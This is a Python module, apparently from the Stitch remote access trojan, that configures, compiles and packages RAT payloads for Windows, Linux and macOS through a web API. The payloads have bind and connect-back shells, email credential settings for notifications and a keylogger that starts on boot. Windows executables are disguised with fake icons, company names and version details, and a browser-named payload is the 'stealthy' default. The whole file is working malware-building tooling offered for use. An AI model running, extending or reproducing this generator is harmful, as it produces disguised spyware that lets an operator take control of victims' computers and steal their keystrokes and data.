#!/usr/bin/env python3
"""
Advanced Payload Generator for Stitch RAT
Provides full compilation capabilities matching terminal interface behavior
"""

import os
import sys
import platform
import tempfile
import shutil
import subprocess
import zipfile
import time
import json
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Union
from datetime import datetime
import configparser
import base64

# Import Stitch components
sys.path.insert(0, os.path.dirname(__file__))
from Application.stitch_gen import assemble_stitch, win_gen_payload, posix_gen_payload
from Application.stitch_pyld_config import stitch_ini, gen_default_st_config
from Application.stitch_utils import *
from Application.Stitch_Vars.globals import *
from Application.Stitch_Vars.payload_setup import *
from Application.Stitch_Vars.nsis import gen_nsis
from Application.Stitch_Vars.makeself import gen_makeself
from build_tools_manager import build_tools_manager

class AdvancedPayloadGenerator:
    """Advanced payload generator with full compilation support"""
    
    def __init__(self):
        self.temp_dirs = []  # Track temp directories for cleanup
        self.generated_files = []  # Track generated files
        self.build_tools = build_tools_manager
        
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()
    
    def cleanup(self):
        """Clean up temporary directories and files"""
        for temp_dir in self.temp_dirs:
            if os.path.exists(temp_dir):
                try:
                    shutil.rmtree(temp_dir)
                except Exception as e:
                    print(f"Warning: Could not clean up {temp_dir}: {e}")
        self.temp_dirs.clear()
    
    def generate_payload_advanced(self, 
                                bind_host: str = "",
                                bind_port: int = 4433,
                                listen_host: str = "localhost",
                                listen_port: int = 4455,
                                enable_bind: bool = True,
                                enable_listen: bool = True,
                                email: str = "None",
                                email_pwd: str = "",
                                keylogger_boot: bool = False,
                                compile_payload: bool = True,
                                target_os: str = "auto",
                                payload_type: str = "auto",
                                create_installers: bool = False,
                                output_format: str = "single") -> Dict:
        """
        Generate advanced payloads with full compilation support
        
        Args:
            bind_host: Host to bind to (empty for all interfaces)
            bind_port: Port to bind on
            listen_host: Host to connect back to
            listen_port: Port to connect back on
            enable_bind: Enable bind mode
            enable_listen: Enable connect-back mode
            email: Email for notifications
            email_pwd: Email password (base64 encoded)
            keylogger_boot: Start keylogger on boot
            compile_payload: Whether to compile to executable
            target_os: Target OS (auto, windows, linux, macos)
            payload_type: Type of payload (auto, all, specific name)
            create_installers: Create installer packages
            output_format: Output format (single, multiple, zip)
        
        Returns:
            Dict with generation results and file information
        """
        
        # Detect target OS if auto
        if target_os == "auto":
            target_os = self._detect_target_os()
        
        # Validate inputs
        self._validate_inputs(bind_port, listen_port, target_os, payload_type)
        
        # Check compilation capabilities
        if compile_payload:
            can_compile = self._check_compilation_capability(target_os)
            if not can_compile:
                return {
                    'success': False,
                    'error': f'Cannot compile for {target_os} - missing build tools',
                    'available_tools': self.build_tools.detect_all_tools(),
                    'suggestions': self._get_tool_installation_suggestions(target_os)
                }
        
        # Create working directory
        work_dir = self._create_work_directory()
        
        try:
            # Step 1: Configure payload
            config_result = self._configure_payload(
                bind_host, bind_port, listen_host, listen_port,
                enable_bind, enable_listen, email, email_pwd, keylogger_boot,
                target_os
            )
            
            if not config_result['success']:
                return config_result
            
            # Step 2: Generate source files
            source_result = self._generate_source_files(work_dir)
            if not source_result['success']:
                return source_result
            
            # Step 3: Compile if requested
            if compile_payload:
                compile_result = self._compile_payloads(
                    work_dir, target_os, payload_type, create_installers
                )
                if not compile_result['success']:
                    return compile_result
                
                # Step 4: Package results
                package_result = self._package_compiled_results(
                    compile_result['files'], output_format, work_dir
                )
                return package_result
            else:
                # Return Python source files
                return self._package_source_results(source_result['files'], work_dir)
        
        except Exception as e:
            return {
                'success': False,
                'error': f'Payload generation failed: {str(e)}',
                'traceback': str(e)
            }
    
    def _detect_target_os(self) -> str:
        """Detect target OS based on current platform"""
        system = platform.system().lower()
        if system == 'windows':
            return 'windows'
        elif system == 'linux':
            return 'linux'
        elif system == 'darwin':
            return 'macos'
        else:
            return 'linux'  # Default fallback
    
    def _validate_inputs(self, bind_port: int, listen_port: int, target_os: str, payload_type: str):
        """Validate input parameters"""
        if not (1 <= bind_port <= 65535):
            raise ValueError(f"Invalid bind port: {bind_port}")
        
        if not (1 <= listen_port <= 65535):
            raise ValueError(f"Invalid listen port: {listen_port}")
        
        valid_os = ['auto', 'windows', 'linux', 'macos']
        if target_os not in valid_os:
            raise ValueError(f"Invalid target OS: {target_os}. Must be one of {valid_os}")
        
        # Validate payload type
        valid_payload_types = ['auto', 'all'] + self._get_all_payload_names()
        if payload_type not in valid_payload_types:
            raise ValueError(f"Invalid payload type: {payload_type}")
    
    def _check_compilation_capability(self, target_os: str) -> bool:
        """Check if we can compile for the target OS"""
        capabilities = self.build_tools.get_compilation_capabilities()
        
        if target_os == 'windows':
            return bool(capabilities['windows_exe'])
        elif target_os == 'linux':
            return bool(capabilities['linux_binary'])
        elif target_os == 'macos':
            return bool(capabilities['macos_app'])
        
        return False
    
    def _get_tool_installation_suggestions(self, target_os: str) -> List[str]:
        """Get suggestions for installing missing tools"""
        suggestions = []
        tools = self.build_tools.detect_all_tools()
        
        if target_os in ['windows', 'linux', 'macos']:
            if not tools['pyinstaller']['available']:
                suggestions.append("Install PyInstaller: pip install pyinstaller")
        
        if target_os == 'windows':
            if not tools['py2exe']['available']:
                suggestions.append("Install py2exe: pip install py2exe")
            if not tools['nsis']['available']:
                suggestions.append("Install NSIS from: https://nsis.sourceforge.io/Download")
        
        return suggestions
    
    def _create_work_directory(self) -> str:
        """Create temporary working directory"""
        work_dir = tempfile.mkdtemp(prefix='stitch_advanced_gen_')
        self.temp_dirs.append(work_dir)
        return work_dir
    
    def _configure_payload(self, bind_host: str, bind_port: int, listen_host: str, 
                          listen_port: int, enable_bind: bool, enable_listen: bool,
                          email: str, email_pwd: str, keylogger_boot: bool,
                          target_os: str) -> Dict:
        """Configure payload settings"""
        try:
            # Ensure config file exists
            if not os.path.exists(st_config):
                gen_default_st_config()
            
            # Create stitch_ini instance and configure
            stini = stitch_ini()
            
            # Set section based on target OS
            if target_os == 'windows':
                stini.section = "Windows"
            elif target_os == 'macos':
                stini.section = "Mac"
            elif target_os == 'linux':
                stini.section = "Linux"
            
            # Configure settings
            stini.set_value('BIND', str(enable_bind))
            stini.set_value('BHOST', bind_host)
            stini.set_value('BPORT', str(bind_port))
            stini.set_value('LISTEN', str(enable_listen))
            stini.set_value('LHOST', listen_host)
            stini.set_value('LPORT', str(listen_port))
            stini.set_value('EMAIL', email)
            stini.set_value('EMAIL_PWD', email_pwd)
            stini.set_value('KEYLOGGER_BOOT', str(keylogger_boot))
            
            return {'success': True, 'message': 'Payload configured successfully'}
            
        except Exception as e:
            return {'success': False, 'error': f'Configuration failed: {str(e)}'}
    
    def _generate_source_files(self, work_dir: str) -> Dict:
        """Generate Python source files"""
        try:
            # Change to configuration directory for generation
            original_cwd = os.getcwd()
            os.chdir(configuration_path)
            
            try:
                # Generate source files using existing Stitch logic
                assemble_stitch()
                
                # List of files that should be generated
                expected_files = [
                    'st_main.py',
                    'st_utils.py', 
                    'st_protocol.py',
                    'st_encryption.py',
                    'requirements.py',
                    'st_win_keylogger.py',
                    'st_osx_keylogger.py',
                    'st_lnx_keylogger.py'
                ]
                
                generated_files = []
                for filename in expected_files:
                    file_path = os.path.join(configuration_path, filename)
                    if os.path.exists(file_path):
                        # Copy to work directory
                        work_file_path = os.path.join(work_dir, filename)
                        shutil.copy2(file_path, work_file_path)
                        generated_files.append(work_file_path)
                
                return {
                    'success': True,
                    'files': generated_files,
                    'message': f'Generated {len(generated_files)} source files'
                }
                
            finally:
                os.chdir(original_cwd)
                
        except Exception as e:
            return {'success': False, 'error': f'Source generation failed: {str(e)}'}
    
    def _compile_payloads(self, work_dir: str, target_os: str, payload_type: str, 
                         create_installers: bool) -> Dict:
        """Compile payloads for target OS"""
        try:
            # Determine which payloads to build
            payload_list = self._get_payload_list(target_os, payload_type)
            
            compiled_files = []
            installer_files = []
            
            # Change to work directory for compilation
            original_cwd = os.getcwd()
            os.chdir(work_dir)
            
            try:
                for payload_name in payload_list:
                    try:
                        if target_os == 'windows':
                            exe_file = self._compile_windows_payload(payload_name, work_dir)
                            if exe_file:
                                compiled_files.append(exe_file)
                        else:
                            binary_file = self._compile_posix_payload(payload_name, work_dir, target_os)
                            if binary_file:
                                compiled_files.append(binary_file)
                    except Exception as e:
                        print(f"Warning: Failed to compile {payload_name}: {e}")
                        continue
                
                # Create installers if requested
                if create_installers and compiled_files:
                    installer_files = self._create_installers(compiled_files, target_os, work_dir)
                
                return {
                    'success': True,
                    'files': compiled_files + installer_files,
                    'compiled_files': compiled_files,
                    'installer_files': installer_files,
                    'message': f'Compiled {len(compiled_files)} payloads, {len(installer_files)} installers'
                }
                
            finally:
                os.chdir(original_cwd)
                
        except Exception as e:
            return {'success': False, 'error': f'Compilation failed: {str(e)}'}
    
    def _get_payload_list(self, target_os: str, payload_type: str) -> List[str]:
        """Get list of payloads to build"""
        if payload_type == 'all':
            if target_os == 'windows':
                return win_payload_list
            elif target_os == 'macos':
                return osx_payload_list  
            elif target_os == 'linux':
                return lnx_payload_list
        elif payload_type == 'auto':
            # Return recommended payload for each OS
            if target_os == 'windows':
                return ['chrome']  # Most common/stealthy
            elif target_os == 'macos':
                return ['chrome']
            elif target_os == 'linux':
                return ['stitch_lnx']
        elif payload_type in self._get_all_payload_names():
            return [payload_type]
        
        return ['chrome']  # Safe fallback
    
    def _get_all_payload_names(self) -> List[str]:
        """Get all available payload names"""
        return win_payload_list + osx_payload_list + lnx_payload_list
    
    def _compile_windows_payload(self, payload_name: str, work_dir: str) -> Optional[str]:
        """Compile Windows payload using py2exe"""
        try:
            # Check if payload_name is valid for Windows
            if payload_name not in win_payload_list:
                raise ValueError(f"Invalid Windows payload: {payload_name}")
            
            # Get payload configuration
            icon = win_payload_Icons[payload_name]
            copyright_info = nsis_LegalCopyright[payload_name]
            company = nsis_CompanyName[payload_name] 
            version = nsis_Version[payload_name]
            name = win_payload_Name[payload_name]
            description = win_payload_Description[payload_name]
            
            # Create output directory
            output_dir = os.path.join(work_dir, 'compiled')
            os.makedirs(output_dir, exist_ok=True)
            
            # Use existing win_gen_payload function
            win_gen_payload(output_dir, icon, payload_name, copyright_info,
                          company, version, name, description)
            
            # Find generated executable
            exe_path = os.path.join(output_dir, f"{payload_name}.exe")
            if os.path.exists(exe_path):
                return exe_path
            
            return None
            
        except Exception as e:
            print(f"Windows compilation error for {payload_name}: {e}")
            return None
    
    def _compile_posix_payload(self, payload_name: str, work_dir: str, target_os: str) -> Optional[str]:
        """Compile Linux/macOS payload using PyInstaller"""
        try:
            # Get icon if available (macOS only)
            icon = None
            if target_os == 'macos' and payload_name in osx_payload_Icons:
                icon = osx_payload_Icons[payload_name]
            
            # Create output directory
            output_dir = os.path.join(work_dir, 'compiled')
            os.makedirs(output_dir, exist_ok=True)
            
            # Use existing posix_gen_payload function
            posix_gen_payload(payload_name, output_dir, icon)
            
            # Find generated binary
            if target_os == 'macos':
                binary_path = os.path.join(output_dir, f"{payload_name}.app")
            else:
                binary_path = os.path.join(output_dir, payload_name)
            
            if os.path.exists(binary_path):
                return binary_path
            
            # Check Binaries subdirectory (fallback)
            binaries_dir = os.path.join(output_dir, 'Binaries')
            if os.path.exists(binaries_dir):
                alt_path = os.path.join(binaries_dir, payload_name)
                if os.path.exists(alt_path):
                    return alt_path
            
            return None
            
        except Exception as e:
            print(f"POSIX compilation error for {payload_name}: {e}")
            return None
    
    def _create_installers(self, compiled_files: List[str], target_os: str, work_dir: str) -> List[str]:
        """Create installer packages"""
        installer_files = []
        
        try:
            if target_os == 'windows':
                installer_files = self._create_nsis_installers(compiled_files, work_dir)
            elif target_os in ['linux', 'macos']:
                installer_files = self._create_makeself_installers(compiled_files, work_dir)
        except Exception as e:
            print(f"Installer creation error: {e}")
        
        return installer_files
    
    def _create_nsis_installers(self, compiled_files: List[str], work_dir: str) -> List[str]:
        """Create NSIS installers for Windows"""
        installer_files = []
        
        # Check if NSIS is available
        tools = self.build_tools.detect_all_tools()
        if not tools['nsis']['available']:
            return installer_files
        
        try:
            for exe_file in compiled_files:
                if exe_file.endswith('.exe'):
                    payload_name = os.path.splitext(os.path.basename(exe_file))[0]
                    
                    # Use existing NSIS generation logic
                    installer_path = self._generate_nsis_installer(exe_file, payload_name, work_dir)
                    if installer_path:
                        installer_files.append(installer_path)
        except Exception as e:
            print(f"NSIS installer creation error: {e}")
        
        return installer_files
    
    def _create_makeself_installers(self, compiled_files: List[str], work_dir: str) -> List[str]:
        """Create Makeself installers for Linux/macOS"""
        installer_files = []
        
        # Check if Makeself is available
        tools = self.build_tools.detect_all_tools()
        if not tools['makeself']['available']:
            return installer_files
        
        try:
            for binary_file in compiled_files:
                payload_name = os.path.basename(binary_file)
                
                # Use existing Makeself generation logic
                installer_path = self._generate_makeself_installer(binary_file, payload_name, work_dir)
                if installer_path:
                    installer_files.append(installer_path)
        except Exception as e:
            print(f"Makeself installer creation error: {e}")
        
        return installer_files
    
    def _generate_nsis_installer(self, exe_file: str, payload_name: str, work_dir: str) -> Optional[str]:
        """Generate NSIS installer for a specific executable"""
        try:
            # This would use the existing gen_nsis function
            # For now, return None as it requires complex NSIS template setup
            return None
        except Exception as e:
            print(f"NSIS generation error: {e}")
            return None
    
    def _generate_makeself_installer(self, binary_file: str, payload_name: str, work_dir: str) -> Optional[str]:
        """Generate Makeself installer for a specific binary"""
        try:
            # This would use the existing gen_makeself function
            # For now, return None as it requires complex Makeself setup
            return None
        except Exception as e:
            print(f"Makeself generation error: {e}")
            return None
    
    def _package_compiled_results(self, files: List[str], output_format: str, work_dir: str) -> Dict:
        """Package compiled results based on output format"""
        if not files:
            return {'success': False, 'error': 'No files to package'}
        
        if output_format == 'single' and len(files) == 1:
            # Single file - return directly
            file_path = files[0]
            return {
                'success': True,
                'type': 'single_file',
                'file_path': file_path,
                'filename': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'download_type': 'direct'
            }
        else:
            # Multiple files - create ZIP
            zip_path = self._create_zip_package(files, work_dir)
            return {
                'success': True,
                'type': 'zip_package',
                'file_path': zip_path,
                'filename': os.path.basename(zip_path),
                'size': os.path.getsize(zip_path),
                'download_type': 'zip',
                'contents': {
                    'total_files': len(files),
                    'file_list': [os.path.basename(f) for f in files]
                }
            }
    
    def _package_source_results(self, files: List[str], work_dir: str) -> Dict:
        """Package Python source results"""
        if len(files) == 1:
            # Single source file
            file_path = files[0]
            return {
                'success': True,
                'type': 'python_source',
                'file_path': file_path,
                'filename': os.path.basename(file_path),
                'size': os.path.getsize(file_path),
                'download_type': 'direct'
            }
        else:
            # Multiple source files - create ZIP
            zip_path = self._create_zip_package(files, work_dir)
            return {
                'success': True,
                'type': 'python_source_package',
                'file_path': zip_path,
                'filename': os.path.basename(zip_path),
                'size': os.path.getsize(zip_path),
                'download_type': 'zip',
                'contents': {
                    'total_files': len(files),
                    'file_list': [os.path.basename(f) for f in files]
                }
            }
    
    def _create_zip_package(self, files: List[str], work_dir: str) -> str:
        """Create ZIP package containing all files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        zip_filename = f"stitch_payload_package_{timestamp}.zip"
        zip_path = os.path.join(work_dir, zip_filename)
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in files:
                if os.path.exists(file_path):
                    # Add file to ZIP with just the filename (no path)
                    arcname = os.path.basename(file_path)
                    zipf.write(file_path, arcname)
        
        return zip_path

# Global instance for use in web application
advanced_payload_generator = AdvancedPayloadGenerator()

def generate_advanced_payload(**kwargs) -> Dict:
    """Generate advanced payload - for API use"""
    return advanced_payload_generator.generate_payload_advanced(**kwargs)

if __name__ == "__main__":
    # Test the advanced payload generator
    generator = AdvancedPayloadGenerator()
    
    print("=== Testing Advanced Payload Generation ===")
    
    # Test configuration
    result = generator.generate_payload_advanced(
        bind_host="0.0.0.0",
        bind_port=4433,
        listen_host="127.0.0.1", 
        listen_port=4455,
        compile_payload=False,  # Start with source generation
        target_os="auto",
        payload_type="auto"
    )
    
    print("Generation Result:")
    print(json.dumps(result, indent=2))